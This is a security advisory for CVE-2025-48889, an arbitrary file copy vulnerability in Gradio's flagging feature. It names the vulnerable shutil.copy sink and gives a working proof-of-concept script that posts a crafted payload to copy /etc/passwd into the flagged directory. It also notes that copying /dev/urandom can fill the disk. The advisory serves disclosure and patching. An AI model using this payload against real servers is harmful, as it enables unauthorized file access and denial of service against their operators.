# [M] Gradio Allows Unauthorized File Copy via Path Manipulation

## Summary
Severity: Medium
Advisory: GHSA-8jw3-6x8j-v96g
CVE: CVE-2025-48889
CWE: CWE-434
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L (CVSS_V3)
Published: 2025-05-29
Source: https://github.com/advisories/GHSA-8jw3-6x8j-v96g
Type: github-advisory

## Affected
- PyPI: `gradio` — affected >=0 <5.31.0

## Details
An arbitrary file copy vulnerability in Gradio's flagging feature allows unauthenticated attackers to copy any readable file from the server's filesystem. While attackers can't read these copied files, they can cause DoS by copying large files (like /dev/urandom) to fill disk space.

### Description
The flagging component doesn't properly validate file paths before copying files. Attackers can send specially crafted requests to the `/gradio_api/run/predict` endpoint to trigger these file copies.

**Source**: User-controlled `path` parameter in the flagging functionality JSON payload  
**Sink**: `shutil.copy` operation in `FileData._copy_to_dir()` method

The vulnerable code flow:
1. A JSON payload is sent to the `/gradio_api/run/predict` endpoint
2. The `path` field within `FileData` object can reference any file on the system
3. When processing this request, the `Component.flag()` method creates a `GradioDataModel` object
4. The `FileData._copy_to_dir()` method uses this path without proper validation:

```python
def _copy_to_dir(self, dir: str) -> FileData:
    pathlib.Path(dir).mkdir(exist_ok=True)
    new_obj = dict(self)

    if not self.path:
        raise ValueError("Source file path is not set")
    new_name = shutil.copy(self.path, dir)  # vulnerable sink
    new_obj["path"] = new_name
    return self.__class__(**new_obj)
```
5. The lack of validation allows copying any file the Gradio process can read

### PoC
The following script demonstrates the vulnerability by copying `/etc/passwd` from the server to Gradio's flagged directory:


Setup a Gradio app:

```python
import gradio as gr

def image_classifier(inp):
    return {'cat': 0.2, 'dog': 0.8}

test = gr.Interface(fn=image_classifier, inputs="image", outputs="label")

test.launch(share=True)
```

Run the PoC:

```python
import requests

url = "https://[your-gradio-app-url]/gradio_api/run/predict"  
headers = {
    "Content-Type": "application/json",  
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" 
}

payload = {
    "data": [
        {
            "path": "/etc/passwd",  
            "url": "[your-gradio-app-url]",
            "orig_name": "network_config", 
            "size": 5000,  
            "mime_type": "text/plain", 
            "meta": {
                "_type": "gradio.FileData"  
            }
        },
        {}  
    ],
    "event_data": None,
    "fn_index": 4, 
    "trigger_id": 11, 
    "session_hash": "test123"  
}

response = requests.post(url, headers=headers, json=payload)
print(f"Status Code: {response.status_code}")
print(f"Response Body: {response.text}")
```

## References
- https://github.com/gradio-app/gradio/security/advisories/GHSA-8jw3-6x8j-v96g
- https://nvd.nist.gov/vuln/detail/CVE-2025-48889
- https://github.com/gradio-app/gradio
- https://github.com/pypa/advisory-database/tree/main/vulns/gradio/PYSEC-2025-119.yaml
